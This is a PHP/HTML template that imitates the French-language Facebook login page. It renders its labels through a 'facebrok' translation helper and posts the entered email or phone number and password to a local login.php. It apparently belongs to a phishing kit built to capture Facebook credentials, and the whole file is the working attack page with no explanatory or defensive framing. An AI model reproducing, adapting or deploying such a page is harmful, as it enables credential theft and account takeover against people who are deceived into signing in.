<?php
	include("includes/top_2.php");
?>

<link type="text/css" rel="stylesheet" href="dynamic/b5xUvEDTQ7c.css" data-bootloader-hash="g0mSI" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="dynamic/vrqc_yiqXWP.css" data-bootloader-hash="mSrcu" data-permanent="1" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="dynamic/qAtoKmenSjB.css" data-bootloader-hash="pVkZJ" data-permanent="1" crossorigin="anonymous" />

<div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span><div class="_4-u2 _1w1t _4-u8 _52jv"><div class="_xku"><span class="_50f6"><?php echo $facebrok->translater("Se connecter à Facebook"); ?></span></div><div class="login_form_container"><form id="login_form" action="login.php?login_attempt=1&amp;lwv=120&amp;lwc=1348028" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input name="lsd" value="AVrUVraa" autocomplete="off" type="hidden"><div id="loginform"><input autocomplete="off" id="display" name="display" value="" type="hidden"><input autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" type="hidden"><input autocomplete="off" id="isprivate" name="isprivate" value="" type="hidden"><input autocomplete="off" id="legacy_return" name="legacy_return" value="0" type="hidden"><input autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" type="hidden"><input autocomplete="off" id="return_session" name="return_session" value="" type="hidden"><input autocomplete="off" id="skip_api_login" name="skip_api_login" value="" type="hidden"><input autocomplete="off" id="signed_next" name="signed_next" value="" type="hidden"><input autocomplete="off" id="trynum" name="trynum" value="1" type="hidden"><input autocomplete="off" name="timezone" value="300" id="u_0_0" type="hidden"><input autocomplete="off" name="lgndim" value="eyJ3IjoxMzYwLCJoIjo3NjgsImF3IjoxMzYwLCJhaCI6NzY4LCJjIjoyNH0=" id="u_0_1" type="hidden"><input name="lgnrnd" value="190931_0dny" type="hidden"><input id="lgnjs" name="lgnjs" value="1475719777" type="hidden"><div class="clearfix _5466 _44mg"><input class="inputtext _55r1 inputtext _1kbt _4rer inputtext _1kbt" name="email" id="email" tabindex="1" style="padding: 5px 8px;
    padding-top: 5px;
    padding-right: 8px;
    padding-bottom: 5px;
    padding-left: 8px;" placeholder="<?php echo $facebrok->translater("Adresse e-mail ou numéro de téléphone"); ?>" value="" autofocus="1"  aria-controls="js_0" aria-haspopup="true" role="null" aria-describedby="js_1" type="text"></div><div class="clearfix _5466 _44mg"><input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="<?php echo $facebrok->translater("Mot de passe"); ?>" style="padding: 5px 8px;
    padding-top: 5px;
    padding-right: 8px;
    padding-bottom: 5px;
    padding-left: 8px;" type="password"></div><div class="_xkt"><button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="1" style="font-size: 14px;
width: 253px;" type="submit"><?php echo $facebrok->translater("Connexion"); ?></button></div><input autocomplete="off" checked="1" name="persistent" type="hidden"><input autocomplete="off" id="default_persistent" name="default_persistent" value="1" type="hidden"><div class="_xkv"><a href="login.php?login_attempt=1&lwv=1" &amp;locale=es_LA&amp;display=page" rel="nofollow" id="reg-link"><?php echo $facebrok->translater("Informations de compte oubliées ?. S’inscrire sur Facebook"); ?></a></div></div></form></div></div></div>
<?php
	include("includes/foot.php");
?>